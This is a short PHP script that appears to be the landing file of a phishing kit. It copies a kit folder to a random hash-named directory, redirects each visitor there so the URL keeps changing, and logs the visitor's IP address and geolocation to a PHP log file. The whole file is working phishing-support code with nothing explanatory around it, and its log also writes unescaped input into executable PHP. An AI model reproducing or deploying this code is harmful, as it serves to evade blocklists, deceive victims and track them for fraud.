<?php

$random=rand(0,100000000000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}

$src="6659";
recurse_copy( $src, $dst );
header("location:$dst");




require_once("6659/userip/ip.codehelper.io.php");
require_once("6659/userip/php_fast_cache.php");

$_ip = new ip_codehelper();

$real_client_ip_address = $_ip->getRealIP();
$visitor_location       = $_ip->getLocation($real_client_ip_address);

$guest_ip   = $visitor_location['IP'];
$guest_country = $visitor_location['CountryName'];
$guest_city  = $visitor_location['CityName'];
$guest_state = $visitor_location['RegionName'];
$zip = $visitor_location['ZipCode'];


$ip = getenv("REMOTE_ADDR");
$file = fopen("log.php","a");



$log = "
<tr>
<td class='auto-style4' style='width:180pt; background: #FFF;'><? echo '$ip' ?>  </td>
<td class='auto-style4' style='background: #FFF;'><? echo '$guest_country' ?>  </td>
<td class='auto-style4' style='background: #FFF;'><? echo '$guest_state' ?>  </td>
<td class='auto-style4' style='background: #FFF;'><? echo '$guest_city' ?> </td>
<td class='auto-style4' style='background: #FFF;'><? echo gmdate ('Y-n-d') ?> </td>
<td class='auto-style4' style='background: #FFF;'><? echo gmdate ('H:i:s') ?> </td>
</tr>";
fwrite($file,$log);
?>